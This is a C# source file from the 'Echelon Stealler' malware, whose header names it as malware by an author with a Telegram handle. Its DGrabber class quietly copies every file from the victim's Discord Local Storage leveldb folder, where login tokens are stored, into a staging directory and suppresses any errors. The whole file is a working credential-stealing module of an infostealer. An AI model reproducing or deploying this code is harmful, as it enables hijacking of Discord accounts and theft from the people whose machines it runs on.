///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System.IO;

namespace Echelon
{
    class DGrabber
    {
        public static int count = 0;
        public static string dir = "\\discord\\Local Storage\\leveldb\\";
        public static void Start(string Echelon_Dir)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + dir).GetFiles())
                {
                    Directory.CreateDirectory(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\");
                    file.CopyTo(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\" + file.Name);
                }
                count++;
            }
            catch  { }

        }
    }
}
